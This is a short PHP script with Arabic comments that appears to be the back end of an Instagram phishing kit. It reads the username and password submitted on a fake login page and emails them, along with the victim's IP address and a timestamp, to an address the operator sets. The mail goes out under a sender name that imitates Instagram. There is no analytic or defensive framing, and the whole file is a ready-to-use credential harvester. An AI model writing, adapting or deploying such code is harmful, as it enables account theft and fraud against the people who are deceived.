<?php
header('Content-Type: application/json; charset=utf-8');

if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = 'your-email@example.com'; // استبدل ببريدك
    $subject = 'تسجيل دخول جديد - إنستجرام';
    
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $message = "
    <html>
    <head>
        <title>تفاصيل تسجيل الدخول</title>
        <style>
            table { border-collapse: collapse; width: 100%; }
            th, td { padding: 8px; text-align: right; border-bottom: 1px solid #ddd; }
        </style>
    </head>
    <body>
        <h2>بيانات تسجيل الدخول</h2>
        <table>
            <tr><th>اسم المستخدم:</th><td>$username</td></tr>
            <tr><th>كلمة السر:</th><td>$password</td></tr>
            <tr><th>وقت الإرسال:</th><td>" . date('Y-m-d H:i:s') . "</td></tr>
            <tr><th>عنوان IP:</th><td>" . $_SERVER['REMOTE_ADDR'] . "</td></tr>
        </table>
    </body>
    </html>
    ";
    
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=utf-8\r\n";
    $headers .= "From: instagram-login@yourdomain.com\r\n";
    
    if(mail($to, $subject, $message, $headers)) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['error' => 'فشل في إرسال البريد']);
    }
} else {
    header('Location: index.html');
}
?>